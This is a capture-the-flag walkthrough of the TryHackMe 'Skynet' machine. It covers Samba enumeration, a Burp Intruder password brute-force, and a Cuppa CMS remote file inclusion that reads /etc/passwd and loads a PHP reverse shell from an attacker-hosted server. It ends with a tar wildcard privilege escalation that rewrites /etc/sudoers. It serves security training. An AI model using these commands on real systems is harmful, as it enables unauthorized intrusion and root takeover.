# [Skynet](https://tryhackme.com/room/skynet)

> Difficulty: Easy
> 
> "Are you able to compromise this Terminator themed machine?"

<details>
  <summary>Scanning</summary>


# Scanning
We run an NMAP with  
```
nmap -sV targetmachineIP
```

+ `-sV`: Not only checks for open ports but the version of the service running.

![image](https://user-images.githubusercontent.com/115602464/195729150-4dab67da-e7ae-4a20-9404-8c3a921d1ed6.png)

Two things pop out to me here. There is a website being hosted on port 80 and samba is running on 139 and 445.

+ `Samba`: is a program that allows users to access shared files, printers, and other resources on a company's intranet.

</details>
  
  
<details>
  <summary>Enumeration</summary>


# Enumeration

Heading over to the target machines IP address in our browser we can see some sort of search engine called "Skynet".

![image](https://user-images.githubusercontent.com/115602464/195732140-1b93ad4d-7a80-4c5f-8d1a-398f288c23b8.png)

Searches don't give results, and the page source provides us with nothing important. 

Let's move on and start a dirb scan which will check for hidden directories and while that is running we will enumerate the samba service.


![image](https://user-images.githubusercontent.com/115602464/195738346-7b486a45-66af-4cc8-a115-5efb7dc1216e.png)

The dirb scan revealed a /squirrelmail/ directory. Let's check it out!

![image](https://user-images.githubusercontent.com/115602464/195739255-2b733e92-9225-4a64-ba0d-48759310adaa.png)

We are given a login form for an email application.

The hint for flag 1 is "Enumerate Samba".

Enumerating the samba service will give us some information on what kind of shares/users are available.

We will use a piece of software called enum4linux. Enum4linux enumerates Windows and Samba systems. [Info](https://www.kali.org/tools/enum4linux/#:~:text=Enum4linux%20is%20a%20tool%20for,%2C%20rpclient%2C%20net%20and%20nmblookup.)
```
enum4linux targetmachineIP
```


The results from enum4linux show us three important pieces of information:

+ `Server`: The server name is `SKYNET`.
+ `Users`: There is a `Miles Dyson` user.
+ `Shares`: There are three shares available, `PRINT$, Miles Dyson, Anonymous`.


![image](https://user-images.githubusercontent.com/115602464/195744944-d73f3b69-2eec-4d83-8520-2ee8a9664c02.png)

The anonymous share is something we can access without credentials!

Lets Access the share using smbclient. We simply provide the IP address of the server and the share we are accessing.

```
smbclient '\\targetmachineIP\Anonymous\'
```
You will be asked for a root password, hit enter and you're logged in as Anonymous!

![image](https://user-images.githubusercontent.com/115602464/195746239-a5cc15e7-0dc1-422d-8cb7-e1e99e0fb4a1.png)

We can download the attention.txt file with `get attention.txt`.

Let's also `cd` into logs and `get` the log1.txt. We will not download log2.txt and log3.txt because we see they are empty.

They will be in the pwd directory of your terminal. Simply run `quit` to exit smbclient.

Lets open up all of the files and see their contents. .

![image](https://user-images.githubusercontent.com/115602464/195748875-eaa4de15-1157-4543-b016-778f1b2adaee.png)

![image](https://user-images.githubusercontent.com/115602464/195748923-5a8f30b5-2b09-4b54-85cc-a6e9a01bb3a8.png)

We can see that there is a user named Miles Dyson, which we enumerated earlier with enum4linux, and log1.txt contained what seems to be a password list.

The list is fairly short in this case and you could manually try the passwords one by one, but let's go through the process as if the list contained a much larger password count.

The two similar tools I use in this situation is Hydra and burp suite intruder. In this case I chose burp suite.

Open up burp suite, start a temporary project, and use burp defaults. 

If you are on the attackBOX for tryhackme your firefox will have an addon called foxyproxy. It will have been configured to work with burp suite.

Turn on firefox, and click on the foxyproxy icon on the top right and select the green burp option. Your burp suite will now intercept your traffic.

![image](https://user-images.githubusercontent.com/115602464/195750364-fc218588-a37e-4579-8d5a-188181b8b6ce.png)

If you are using your own machine and are using a VPN to work on this room, check out this [Guide](https://null-byte.wonderhowto.com/how-to/use-burp-foxyproxy-easily-switch-between-proxy-settings-0196630/).

Once that is on, go to the squirrelmail login form, enter milesdyson for user and enter any random characters for pass. Check your proxy tab inside burp. There should be a POST request that looks like this:

![image](https://user-images.githubusercontent.com/115602464/195753047-94590f91-cc27-443d-a2a9-9ea4f51f0e13.png)

Right click on this and send it to intruder. Hit clear on the right side. We need to select the location in the request that will be attacked with intruder.

In this case we assume we know the correct username, milesdyson, so we just need to get the correct password.

Highlight the password that you typed in earlier in the login form and click the ADD button on the right side. 

Your request should only have the password part of the form highlighted with symbols around your pass:

![image](https://user-images.githubusercontent.com/115602464/195753133-878f7c15-7c64-4a54-b503-8d62583eb2b6.png)

Click on the payloads tab at the top, highlight and copy all of the passwords in the log1.txt file, and paste them into the payload options section.

![image](https://user-images.githubusercontent.com/115602464/195753604-3c1e0c57-f641-444a-8575-819ec0853f33.png)

Your attack is ready, just hit start attack at the top right of burp!

You should notice fairly quickly that there is one password that stands out. It will stand out because the response code will be different than the rest.

![image](https://user-images.githubusercontent.com/115602464/195754208-60a84a13-ebe3-4411-ae52-fd2ff75da949.png)

Login with milesdyson and your new found password to explore his mail.

We see an email containing an SMB password reset!

Lets use smbclient to login as milesdyson.

```
smbclient '\\targetmachineIP\milesdyson\' -U milesdyson
```
After looking around a bit we can see a notes directory with a file called `important.txt`. Lets `get` the file and `cat` it on our machine.

The contents seem to be a to-do list with the very first item being `Add features to beta CMS /45kra24zxs28v3yd`.

The `/45kra24zxs28v3yd` is a directory. Lets go to `targetmachineIP/45kra24zxs28v3yd`.

![image](https://user-images.githubusercontent.com/115602464/195756477-77cd0b84-afc1-4f8d-a90a-b4ce48a292a2.png)

There doesn't seem to be anything important here. Lets run dirb to find any directories hidden within this one.

```
dirb http://10.10.209.119/45kra24zxs28v3yd/
```

One of the directories that is found is /administrator.

![image](https://user-images.githubusercontent.com/115602464/195756685-5b5372c6-bf98-434e-bd5d-29e0c7cc4315.png)

Visiting /administrator we see a cuppa CMS login. 

</details>
  
  
<details>
  <summary>Exploitation</summary>  
  
# Exploitation

Before trying to attack the login form, lets see if there is an exploit that exists for `Cuppa CMS`.

![image](https://user-images.githubusercontent.com/115602464/195757669-54b67500-1807-4f4f-96f5-347a68db60ff.png)

Reading the exploit page we can see that this isn't a python script. This is a remote file inclusion vulnerability. This exploit can be done through the URL.

![image](https://user-images.githubusercontent.com/115602464/195758051-adf1f722-573c-40ee-b687-f8e3bc75619d.png)


We can test this by running the command

```
http://10.10.209.119/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

Since this works we can use the first example in the picture above to load up a php reverse shell.

Lets download a php reverse shell and modify the IP to match our machine and the port to be 1337.

We also need to start a python http server. We can do this with `python2 -m SimpleHTTPServer 4444`.

Place the reverse shell in the directory where you ran your python server.

Your reverse shell should look like this:

![image](https://user-images.githubusercontent.com/115602464/195759360-550fbe15-c027-4f1a-a466-190a4cdf8920.png)

Lets also host a listener on our attacker machine. This can be done with `nc -lvnp 1337`.

At this point we should have a listener on port 1337 and our python server on port 4444.

Now on the target machine we can access the revshell by going to our python server. Your IP will be different but it should look something like this:

`http://10.10.209.119/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.100.47:4444/revshell.php`

Check your listener and you should have a reverse shell!

Lets look around a little bit. There is a milesdyson folder in the home directory.

![image](https://user-images.githubusercontent.com/115602464/195760575-9c06e4d8-6219-4139-9acd-c3e972f93b7a.png)

The user flag is inside user.txt. 🚩

</details>

<details>
  <summary>Escalation</summary>
  
# Escalation

The backups folder contains a backup.sh file:

![image](https://user-images.githubusercontent.com/115602464/195760730-62664aec-e164-4225-9be7-dccf7a976c8d.png)

This shell script has a wildcard exploit. [More info here](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)

We can exploit this by changing into the /var/www/html directory and running:

```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1
```

Lets upgrade our shell a little bit to be able to run `sudo -l`.

```
python -c 'import pty;pty.spawn("/bin/bash")';
```

After a couple of minutes we run `sudo -l`:

![image](https://user-images.githubusercontent.com/115602464/195761720-4a9a84b6-9183-41e3-a8ba-d12f80c505b4.png)

Great! Lets get the root.txt file and get our last flag! 🚩

![image](https://user-images.githubusercontent.com/115602464/195762012-08b427cb-439d-4f07-a25a-97d0739a97f1.png)


</details>
